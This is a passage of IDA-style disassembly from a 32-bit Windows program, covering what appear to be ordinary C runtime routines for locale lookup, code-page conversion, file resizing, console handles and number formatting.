                mov     eax, [ebp+var_C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41CA2E:                             ; CODE XREF: sub_41C9B0+17↑j
                                        ; sub_41C9B0+3C↑j ...
                movzx   eax, [ebp+CharType]
                movzx   ecx, [ebp+arg_4]
                and     eax, ecx
                leave
                retn
sub_41C9B0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41CA3A(LCID Locale)
sub_41CA3A      proc near               ; CODE XREF: sub_418E45+25D↑p
                                        ; sub_41922F+152↑p

LCData          = byte ptr -0Ch
var_6           = byte ptr -6
var_4           = dword ptr -4
Locale          = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    6               ; cchData
                lea     eax, [ebp+LCData]
                push    eax             ; lpLCData
                push    1004h           ; LCType
                push    [ebp+Locale]    ; Locale
                mov     [ebp+var_6], 0
                call    ds:GetLocaleInfoA
                test    eax, eax
                jnz     short loc_41CA6D
                or      eax, 0FFFFFFFFh
                jmp     short loc_41CA77
; ---------------------------------------------------------------------------

loc_41CA6D:                             ; CODE XREF: sub_41CA3A+2C↑j
                lea     eax, [ebp+LCData]
                push    eax
                call    sub_40E80D
                pop     ecx

loc_41CA77:                             ; CODE XREF: sub_41CA3A+31↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41CA3A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41CA83(UINT CodePage, UINT, int, int, int, int)
sub_41CA83      proc near               ; CODE XREF: sub_418E45+288↑p
                                        ; sub_418E45+339↑p ...

var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
lpMultiByteStr  = dword ptr -28h
cbMultiByte     = dword ptr -24h
lpMem           = dword ptr -20h
lpWideCharStr   = dword ptr -1Ch
CPInfo          = _cpinfo ptr -18h
var_4           = dword ptr -4
CodePage        = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 34h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_8]
                mov     ecx, [ebp+arg_10]
                mov     [ebp+lpMultiByteStr], eax
                mov     eax, [ebp+arg_C]
                push    ebx
                mov     [ebp+var_30], eax
                mov     eax, [eax]
                push    esi
                mov     [ebp+cbMultiByte], eax
                mov     eax, [ebp+CodePage]
                push    edi
                xor     edi, edi
                mov     [ebp+var_34], ecx
                mov     [ebp+lpMem], edi
                mov     [ebp+var_2C], edi
                cmp     eax, [ebp+arg_4]
                jz      loc_41CC22
                mov     esi, ds:GetCPInfo
                lea     ecx, [ebp+CPInfo]
                push    ecx             ; lpCPInfo
                push    eax             ; CodePage
                call    esi ; GetCPInfo
                mov     ebx, ds:MultiByteToWideChar
                test    eax, eax
                jz      short loc_41CB38
                cmp     [ebp+CPInfo.MaxCharSize], 1
                jnz     short loc_41CB38
                lea     eax, [ebp+CPInfo]
                push    eax             ; lpCPInfo
                push    [ebp+arg_4]     ; CodePage
                call    esi ; GetCPInfo
                test    eax, eax
                jz      short loc_41CB38
                cmp     [ebp+CPInfo.MaxCharSize], 1
                jnz     short loc_41CB38
                mov     esi, [ebp+cbMultiByte]
                mov     [ebp+var_2C], 1
                cmp     esi, 0FFFFFFFFh
                jnz     short loc_41CB0E
                push    [ebp+lpMultiByteStr]
                call    sub_4102A0
                mov     esi, eax
                pop     ecx
                inc     esi

loc_41CB0E:                             ; CODE XREF: sub_41CA83+7D↑j
                cmp     esi, edi

loc_41CB10:                             ; CODE XREF: sub_41CA83+C8↓j
                jle     short loc_41CB6D
                cmp     esi, 7FFFFFF0h
                ja      short loc_41CB6D
                lea     eax, [esi+esi+8]
                cmp     eax, 400h
                ja      short loc_41CB54
                call    __alloca_probe_16
                mov     eax, esp
                cmp     eax, edi
                jz      short loc_41CB68
                mov     dword ptr [eax], 0CCCCh
                jmp     short loc_41CB65
; ---------------------------------------------------------------------------

loc_41CB38:                             ; CODE XREF: sub_41CA83+55↑j
                                        ; sub_41CA83+5B↑j ...
                push    edi             ; cchWideChar
                push    edi             ; lpWideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    1               ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    ebx ; MultiByteToWideChar
                mov     esi, eax
                cmp     esi, edi
                jnz     short loc_41CB10

loc_41CB4D:                             ; CODE XREF: sub_41CA83+F0↓j
                xor     eax, eax
                jmp     loc_41CC25
; ---------------------------------------------------------------------------

loc_41CB54:                             ; CODE XREF: sub_41CA83+A0↑j
                push    eax
                call    sub_40FE32
                pop     ecx
                cmp     eax, edi
                jz      short loc_41CB68
                mov     dword ptr [eax], 0DDDDh

loc_41CB65:                             ; CODE XREF: sub_41CA83+B3↑j
                add     eax, 8

loc_41CB68:                             ; CODE XREF: sub_41CA83+AB↑j
                                        ; sub_41CA83+DA↑j
                mov     [ebp+lpWideCharStr], eax
                jmp     short loc_41CB70
; ---------------------------------------------------------------------------

loc_41CB6D:                             ; CODE XREF: sub_41CA83:loc_41CB10↑j
                                        ; sub_41CA83+95↑j
                mov     [ebp+lpWideCharStr], edi

loc_41CB70:                             ; CODE XREF: sub_41CA83+E8↑j
                cmp     [ebp+lpWideCharStr], edi
                jz      short loc_41CB4D
                lea     eax, [esi+esi]
                push    eax
                push    edi
                push    [ebp+lpWideCharStr]
                call    sub_413520
                add     esp, 0Ch
                push    esi             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    1               ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    ebx ; MultiByteToWideChar
                test    eax, eax
                jz      short loc_41CC19
                mov     ebx, [ebp+var_34]
                cmp     ebx, edi
                jz      short loc_41CBBE
                push    edi             ; lpUsedDefaultChar
                push    edi             ; lpDefaultChar
                push    [ebp+arg_14]    ; cbMultiByte
                push    ebx             ; lpMultiByteStr
                push    esi             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                push    edi             ; dwFlags
                push    [ebp+arg_4]     ; CodePage
                call    ds:WideCharToMultiByte
                test    eax, eax
                jz      short loc_41CC19
                mov     [ebp+lpMem], ebx
                jmp     short loc_41CC19
; ---------------------------------------------------------------------------

loc_41CBBE:                             ; CODE XREF: sub_41CA83+11C↑j
                mov     ebx, ds:WideCharToMultiByte
                cmp     [ebp+var_2C], edi
                jnz     short loc_41CBDD
                push    edi             ; lpUsedDefaultChar
                push    edi             ; lpDefaultChar
                push    edi             ; cbMultiByte
                push    edi             ; lpMultiByteStr
                push    esi             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                push    edi             ; dwFlags
                push    [ebp+arg_4]     ; CodePage
                call    ebx ; WideCharToMultiByte
                mov     esi, eax
                cmp     esi, edi
                jz      short loc_41CC19

loc_41CBDD:                             ; CODE XREF: sub_41CA83+144↑j
                push    esi
                push    1
                call    sub_412BF8
                pop     ecx
                pop     ecx
                mov     [ebp+lpMem], eax
                cmp     eax, edi
                jz      short loc_41CC19
                push    edi             ; lpUsedDefaultChar
                push    edi             ; lpDefaultChar
                push    esi             ; cbMultiByte
                push    eax             ; lpMultiByteStr
                push    esi             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                push    edi             ; dwFlags
                push    [ebp+arg_4]     ; CodePage
                call    ebx ; WideCharToMultiByte
                cmp     eax, edi
                jnz     short loc_41CC0E
                push    [ebp+lpMem]     ; lpMem
                call    sub_40FD55
                pop     ecx
                mov     [ebp+lpMem], edi
                jmp     short loc_41CC19
; ---------------------------------------------------------------------------

loc_41CC0E:                             ; CODE XREF: sub_41CA83+17B↑j
                cmp     [ebp+cbMultiByte], 0FFFFFFFFh
                jz      short loc_41CC19
                mov     ecx, [ebp+var_30]
                mov     [ecx], eax

loc_41CC19:                             ; CODE XREF: sub_41CA83+115↑j
                                        ; sub_41CA83+134↑j ...
                push    [ebp+lpWideCharStr]
                call    sub_418E25
                pop     ecx

loc_41CC22:                             ; CODE XREF: sub_41CA83+3A↑j
                mov     eax, [ebp+lpMem]

loc_41CC25:                             ; CODE XREF: sub_41CA83+CC↑j
                lea     esp, [ebp-40h]
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41CA83      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000016 BYTES: COLLAPSED FUNCTION __alloca_probe_16. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION __alloca_probe_8. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41CC6C      proc near               ; CODE XREF: sub_419E86+3C4↑p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
lpMem           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                push    ebx
                push    esi
                push    edi
                xor     ebx, ebx
                push    1               ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    [ebp+arg_0]     ; int
                mov     [ebp+var_10], ebx
                mov     [ebp+var_C], ebx
                call    sub_41892C
                mov     [ebp+var_18], eax
                and     eax, edx
                add     esp, 10h
                mov     [ebp+var_14], edx
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41CCF4
                push    2               ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                mov     ecx, eax
                and     ecx, edx
                add     esp, 10h
                cmp     ecx, 0FFFFFFFFh
                jz      short loc_41CCF4
                mov     esi, [ebp+arg_4]
                mov     edi, [ebp+arg_8]
                sub     esi, eax
                sbb     edi, edx
                js      loc_41CD89
                jg      short loc_41CCCD
                cmp     esi, ebx
                jbe     loc_41CD89

loc_41CCCD:                             ; CODE XREF: sub_41CC6C+57↑j
                mov     ebx, 1000h
                push    ebx             ; dwBytes
                push    8               ; dwFlags
                call    ds:GetProcessHeap
                push    eax             ; hHeap
                call    ds:HeapAlloc
                mov     [ebp+lpMem], eax
                test    eax, eax
                jnz     short loc_41CD00
                call    sub_41090E
                mov     dword ptr [eax], 0Ch

loc_41CCF4:                             ; CODE XREF: sub_41CC6C+2D↑j
                                        ; sub_41CC6C+45↑j ...
                call    sub_41090E
                mov     eax, [eax]

loc_41CCFB:                             ; CODE XREF: sub_41CC6C+1B1↓j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_41CD00:                             ; CODE XREF: sub_41CC6C+7B↑j
                push    8000h
                push    [ebp+arg_0]
                call    sub_41CE22
                pop     ecx
                pop     ecx
                mov     [ebp+var_8], eax

loc_41CD12:                             ; CODE XREF: sub_41CC6C+D1↓j
                                        ; sub_41CC6C+D5↓j
                test    edi, edi
                jl      short loc_41CD20
                jg      short loc_41CD1C
                cmp     esi, ebx
                jb      short loc_41CD20

loc_41CD1C:                             ; CODE XREF: sub_41CC6C+AA↑j
                mov     eax, ebx
                jmp     short loc_41CD22
; ---------------------------------------------------------------------------

loc_41CD20:                             ; CODE XREF: sub_41CC6C+A8↑j
                                        ; sub_41CC6C+AE↑j
                mov     eax, esi

loc_41CD22:                             ; CODE XREF: sub_41CC6C+B2↑j
                push    eax             ; nNumberOfBytesToWrite
                push    [ebp+lpMem]     ; int
                push    [ebp+arg_0]     ; int
                call    sub_4148B5
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41CD6C
                cdq
                sub     esi, eax
                sbb     edi, edx
                js      short loc_41CD43
                jg      short loc_41CD12
                test    esi, esi
                ja      short loc_41CD12

loc_41CD43:                             ; CODE XREF: sub_41CC6C+CF↑j
                mov     esi, [ebp+var_10]

loc_41CD46:                             ; CODE XREF: sub_41CC6C+11B↓j
                push    [ebp+var_8]
                push    [ebp+arg_0]
                call    sub_41CE22
                pop     ecx
                pop     ecx
                push    [ebp+lpMem]     ; lpMem
                push    0               ; dwFlags
                call    ds:GetProcessHeap
                push    eax             ; hHeap
                call    ds:HeapFree
                xor     ebx, ebx
                jmp     loc_41CDF2
; ---------------------------------------------------------------------------

loc_41CD6C:                             ; CODE XREF: sub_41CC6C+C8↑j
                call    sub_410921
                cmp     dword ptr [eax], 5
                jnz     short loc_41CD81
                call    sub_41090E
                mov     dword ptr [eax], 0Dh

loc_41CD81:                             ; CODE XREF: sub_41CC6C+108↑j
                or      esi, 0FFFFFFFFh
                mov     [ebp+var_C], esi
                jmp     short loc_41CD46
; ---------------------------------------------------------------------------

loc_41CD89:                             ; CODE XREF: sub_41CC6C+51↑j
                                        ; sub_41CC6C+5B↑j
                cmp     edi, ebx
                jg      short loc_41CDFE
                jl      short loc_41CD93
                cmp     esi, ebx
                jnb     short loc_41CDFE

loc_41CD93:                             ; CODE XREF: sub_41CC6C+121↑j
                push    ebx             ; dwMoveMethod
                push    [ebp+arg_8]     ; int
                push    [ebp+arg_4]     ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                and     eax, edx
                add     esp, 10h
                cmp     eax, 0FFFFFFFFh
                jz      loc_41CCF4
                push    [ebp+arg_0]
                call    sub_416266
                pop     ecx
                push    eax             ; hFile
                call    ds:SetEndOfFile
                neg     eax
                sbb     eax, eax
                neg     eax
                dec     eax
                cdq
                mov     [ebp+var_10], eax
                and     eax, edx
                mov     [ebp+var_C], edx
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41CDFE
                call    sub_41090E
                mov     dword ptr [eax], 0Dh
                call    sub_410921
                mov     esi, eax
                call    ds:GetLastError
                mov     [esi], eax
                mov     esi, [ebp+var_10]

loc_41CDF2:                             ; CODE XREF: sub_41CC6C+FB↑j
                and     esi, [ebp+var_C]
                cmp     esi, 0FFFFFFFFh
                jz      loc_41CCF4

loc_41CDFE:                             ; CODE XREF: sub_41CC6C+11F↑j
                                        ; sub_41CC6C+125↑j ...
                push    ebx             ; dwMoveMethod
                push    [ebp+var_14]    ; int
                push    [ebp+var_18]    ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                and     eax, edx
                add     esp, 10h
                cmp     eax, 0FFFFFFFFh
                jz      loc_41CCF4
                xor     eax, eax
                jmp     loc_41CCFB
sub_41CC6C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41CE22      proc near               ; CODE XREF: sub_41CC6C+9C↑p
                                        ; sub_41CC6C+E0↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                mov     eax, esi
                sar     eax, 5
                lea     edx, dword_42CA00[eax*4]
                mov     eax, [edx]
                and     esi, 1Fh
                shl     esi, 6
                lea     ecx, [eax+esi]
                mov     al, [ecx+24h]
                add     al, al
                push    edi
                movzx   edi, byte ptr [ecx+4]
                movsx   eax, al
                and     edi, 80h
                sar     eax, 1
                cmp     ebx, 4000h
                jz      short loc_41CEB3
                cmp     ebx, 8000h
                jz      short loc_41CEAD
                cmp     ebx, 10000h
                jz      short loc_41CE99
                cmp     ebx, 20000h
                jz      short loc_41CE99
                cmp     ebx, 40000h
                jnz     short loc_41CEC0
                or      byte ptr [ecx+4], 80h
                mov     ecx, [edx]
                lea     ecx, [ecx+esi+24h]
                mov     dl, [ecx]
                and     dl, 81h
                or      dl, 1

loc_41CE95:                             ; CODE XREF: sub_41CE22+89↓j
                mov     [ecx], dl
                jmp     short loc_41CEC0
; ---------------------------------------------------------------------------

loc_41CE99:                             ; CODE XREF: sub_41CE22+4F↑j
                                        ; sub_41CE22+57↑j
                or      byte ptr [ecx+4], 80h
                mov     ecx, [edx]
                lea     ecx, [ecx+esi+24h]
                mov     dl, [ecx]
                and     dl, 82h
                or      dl, 2
                jmp     short loc_41CE95
; ---------------------------------------------------------------------------

loc_41CEAD:                             ; CODE XREF: sub_41CE22+47↑j
                and     byte ptr [ecx+4], 7Fh
                jmp     short loc_41CEC0
; ---------------------------------------------------------------------------

loc_41CEB3:                             ; CODE XREF: sub_41CE22+3F↑j
                or      byte ptr [ecx+4], 80h
                mov     ecx, [edx]
                lea     ecx, [ecx+esi+24h]
                and     byte ptr [ecx], 80h

loc_41CEC0:                             ; CODE XREF: sub_41CE22+5F↑j
                                        ; sub_41CE22+75↑j ...
                test    edi, edi
                pop     edi
                pop     esi
                pop     ebx
                jnz     short loc_41CECE
                mov     eax, 8000h
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41CECE:                             ; CODE XREF: sub_41CE22+A3↑j
                neg     eax
                sbb     eax, eax
                and     eax, 0C000h
                add     eax, 4000h
                pop     ebp
                retn
sub_41CE22      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41CEDE      proc near               ; CODE XREF: sub_419E86+3C↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                xor     esi, esi
                cmp     eax, esi
                jnz     short loc_41CF0A
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                push    16h
                pop     eax
                jmp     short loc_41CF14
; ---------------------------------------------------------------------------

loc_41CF0A:                             ; CODE XREF: sub_41CEDE+D↑j
                mov     ecx, dword_42B57C
                mov     [eax], ecx
                xor     eax, eax

loc_41CF14:                             ; CODE XREF: sub_41CEDE+2A↑j
                pop     esi
                pop     ebp
                retn
sub_41CEDE      endp


; =============== S U B R O U T I N E =======================================


sub_41CF17      proc near               ; CODE XREF: sub_41AB93+26↑p
                xor     eax, eax
                push    eax             ; hTemplateFile
                push    eax             ; dwFlagsAndAttributes
                push    3               ; dwCreationDisposition
                push    eax             ; lpSecurityAttributes
                push    3               ; dwShareMode
                push    40000000h       ; dwDesiredAccess
                push    offset FileName ; "CONOUT$"
                call    ds:CreateFileA
                mov     hConsoleOutput, eax
                retn
sub_41CF17      endp


; =============== S U B R O U T I N E =======================================


sub_41CF36      proc near               ; DATA XREF: .rdata:00420220↓o
                mov     eax, hConsoleOutput
                push    esi
                mov     esi, ds:CloseHandle
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41CF4F
                cmp     eax, 0FFFFFFFEh
                jz      short loc_41CF4F
                push    eax             ; hObject
                call    esi ; CloseHandle

loc_41CF4F:                             ; CODE XREF: sub_41CF36+F↑j
                                        ; sub_41CF36+14↑j
                mov     eax, dword_4262E0
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41CF61
                cmp     eax, 0FFFFFFFEh
                jz      short loc_41CF61
                push    eax             ; hObject
                call    esi ; CloseHandle

loc_41CF61:                             ; CODE XREF: sub_41CF36+21↑j
                                        ; sub_41CF36+26↑j
                pop     esi
                retn
sub_41CF36      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41CF70      proc near               ; CODE XREF: sub_41BD35+104↑p

arg_0           = dword ptr  8
arg_4           = byte ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    edi
                mov     edi, [ebp+arg_0]
                xor     eax, eax
                or      ecx, 0FFFFFFFFh
                repne scasb
                add     ecx, 1
                neg     ecx
                sub     edi, 1
                mov     al, [ebp+arg_4]
                std
                repne scasb
                add     edi, 1
                cmp     [edi], al
                jz      short loc_41CF97
                xor     eax, eax
                jmp     short loc_41CF99
; ---------------------------------------------------------------------------

loc_41CF97:                             ; CODE XREF: sub_41CF70+21↑j
                mov     eax, edi

loc_41CF99:                             ; CODE XREF: sub_41CF70+25↑j
                cld
                pop     edi
                leave
                retn
sub_41CF70      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41CF9D      proc near               ; CODE XREF: sub_41BA35+17↑p

var_28          = byte ptr -28h
var_24          = byte ptr -24h
var_1C          = dword ptr -1Ch
var_18          = byte ptr -18h
var_14          = dword ptr -14h
var_10          = byte ptr -10h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 28h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                push    [ebp+arg_8]
                mov     edi, [ebp+arg_4]
                lea     ecx, [ebp+var_24]
                call    sub_40E461
                lea     eax, [ebp+var_24]
                push    eax
                xor     ebx, ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    edi
                lea     eax, [ebp+var_28]
                push    eax
                lea     eax, [ebp+var_10]
                push    eax
                call    sub_415727
                mov     [ebp+var_14], eax
                lea     eax, [ebp+var_10]
                push    esi
                push    eax
                call    sub_41AE9C
                add     esp, 28h
                test    byte ptr [ebp+var_14], 3
                jnz     short loc_41D01C
                cmp     eax, 1
                jnz     short loc_41D007

loc_41CFF6:                             ; CODE XREF: sub_41CF9D+89↓j
                cmp     [ebp+var_18], bl
                jz      short loc_41D002
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41D002:                             ; CODE XREF: sub_41CF9D+5C↑j
                push    3

loc_41D004:                             ; CODE XREF: sub_41CF9D+7D↓j
                pop     eax
                jmp     short loc_41D036
; ---------------------------------------------------------------------------

loc_41D007:                             ; CODE XREF: sub_41CF9D+57↑j
                cmp     eax, 2
                jnz     short loc_41D028

loc_41D00C:                             ; CODE XREF: sub_41CF9D+83↓j
                cmp     [ebp+var_18], bl
                jz      short loc_41D018
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41D018:                             ; CODE XREF: sub_41CF9D+72↑j
                push    4
                jmp     short loc_41D004
; ---------------------------------------------------------------------------

loc_41D01C:                             ; CODE XREF: sub_41CF9D+52↑j
                test    byte ptr [ebp+var_14], 1
                jnz     short loc_41D00C
                test    byte ptr [ebp+var_14], 2
                jnz     short loc_41CFF6

loc_41D028:                             ; CODE XREF: sub_41CF9D+6D↑j
                cmp     [ebp+var_18], bl
                jz      short loc_41D034
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41D034:                             ; CODE XREF: sub_41CF9D+8E↑j
                xor     eax, eax

loc_41D036:                             ; CODE XREF: sub_41CF9D+68↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41CF9D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41D045      proc near               ; CODE XREF: sub_41BA35+30↑p

var_28          = byte ptr -28h
var_24          = byte ptr -24h
var_1C          = dword ptr -1Ch
var_18          = byte ptr -18h
var_14          = dword ptr -14h
var_10          = byte ptr -10h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 28h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                push    [ebp+arg_8]
                mov     edi, [ebp+arg_4]
                lea     ecx, [ebp+var_24]
                call    sub_40E461
                lea     eax, [ebp+var_24]
                push    eax
                xor     ebx, ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    edi
                lea     eax, [ebp+var_28]
                push    eax
                lea     eax, [ebp+var_10]
                push    eax
                call    sub_415727
                mov     [ebp+var_14], eax
                lea     eax, [ebp+var_10]
                push    esi
                push    eax
                call    sub_41B3E0
                add     esp, 28h
                test    byte ptr [ebp+var_14], 3
                jnz     short loc_41D0C4
                cmp     eax, 1
                jnz     short loc_41D0AF

loc_41D09E:                             ; CODE XREF: sub_41D045+89↓j
                cmp     [ebp+var_18], bl
                jz      short loc_41D0AA
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41D0AA:                             ; CODE XREF: sub_41D045+5C↑j
                push    3

loc_41D0AC:                             ; CODE XREF: sub_41D045+7D↓j
                pop     eax
                jmp     short loc_41D0DE
; ---------------------------------------------------------------------------

loc_41D0AF:                             ; CODE XREF: sub_41D045+57↑j
                cmp     eax, 2
                jnz     short loc_41D0D0

loc_41D0B4:                             ; CODE XREF: sub_41D045+83↓j
                cmp     [ebp+var_18], bl
                jz      short loc_41D0C0
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41D0C0:                             ; CODE XREF: sub_41D045+72↑j
                push    4
                jmp     short loc_41D0AC
; ---------------------------------------------------------------------------

loc_41D0C4:                             ; CODE XREF: sub_41D045+52↑j
                test    byte ptr [ebp+var_14], 1
                jnz     short loc_41D0B4
                test    byte ptr [ebp+var_14], 2
                jnz     short loc_41D09E

loc_41D0D0:                             ; CODE XREF: sub_41D045+6D↑j
                cmp     [ebp+var_18], bl
                jz      short loc_41D0DC
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41D0DC:                             ; CODE XREF: sub_41D045+8E↑j
                xor     eax, eax

loc_41D0DE:                             ; CODE XREF: sub_41D045+68↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41D045      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41D0ED      proc near               ; CODE XREF: sub_41BC45+98↑p
                                        ; sub_41C19F+87↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_C]
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                xor     ebx, ebx
                push    edi
                mov     edi, [ecx+0Ch]
                cmp     esi, ebx
                jnz     short loc_41D122

loc_41D104:                             ; CODE XREF: sub_41D0ED+38↓j
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_41D10E:                             ; CODE XREF: sub_41D0ED+5B↓j
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     loc_41D1A7
; ---------------------------------------------------------------------------

loc_41D122:                             ; CODE XREF: sub_41D0ED+15↑j
                cmp     [ebp+arg_4], ebx
                jbe     short loc_41D104
                mov     edx, [ebp+arg_8]
                cmp     edx, ebx
                mov     [esi], bl
                jle     short loc_41D134
                mov     eax, edx
                jmp     short loc_41D136
; ---------------------------------------------------------------------------

loc_41D134:                             ; CODE XREF: sub_41D0ED+41↑j
                xor     eax, eax

loc_41D136:                             ; CODE XREF: sub_41D0ED+45↑j
                inc     eax
                cmp     [ebp+arg_4], eax
                ja      short loc_41D14A
                call    sub_41090E
                push    22h
                pop     ecx
                mov     [eax], ecx
                mov     esi, ecx
                jmp     short loc_41D10E
; ---------------------------------------------------------------------------

loc_41D14A:                             ; CODE XREF: sub_41D0ED+4D↑j
                cmp     edx, ebx
                mov     byte ptr [esi], 30h
                lea     eax, [esi+1]
                jle     short loc_41D16E

loc_41D154:                             ; CODE XREF: sub_41D0ED+7C↓j
                mov     cl, [edi]
                cmp     cl, bl
                jz      short loc_41D160
                movsx   ecx, cl
                inc     edi
                jmp     short loc_41D163
; ---------------------------------------------------------------------------

loc_41D160:                             ; CODE XREF: sub_41D0ED+6B↑j
                push    30h
                pop     ecx

loc_41D163:                             ; CODE XREF: sub_41D0ED+71↑j
                mov     [eax], cl
                inc     eax
                dec     edx
                cmp     edx, ebx
                jg      short loc_41D154
                mov     ecx, [ebp+arg_C]

loc_41D16E:                             ; CODE XREF: sub_41D0ED+65↑j
                cmp     edx, ebx
                mov     [eax], bl
                jl      short loc_41D186
                cmp     byte ptr [edi], 35h
                jl      short loc_41D186
                jmp     short loc_41D17E
; ---------------------------------------------------------------------------

loc_41D17B:                             ; CODE XREF: sub_41D0ED+95↓j
                mov     byte ptr [eax], 30h

loc_41D17E:                             ; CODE XREF: sub_41D0ED+8C↑j
                dec     eax
                cmp     byte ptr [eax], 39h
                jz      short loc_41D17B
                inc     byte ptr [eax]

loc_41D186:                             ; CODE XREF: sub_41D0ED+85↑j
                                        ; sub_41D0ED+8A↑j
                cmp     byte ptr [esi], 31h
                jnz     short loc_41D190
                inc     dword ptr [ecx+4]
                jmp     short loc_41D1A5
; ---------------------------------------------------------------------------

loc_41D190:                             ; CODE XREF: sub_41D0ED+9C↑j
                lea     edi, [esi+1]
                push    edi
                call    sub_4102A0
                inc     eax
                push    eax
                push    edi
                push    esi
                call    sub_40F9F0
                add     esp, 10h

loc_41D1A5:                             ; CODE XREF: sub_41D0ED+A1↑j
                xor     eax, eax

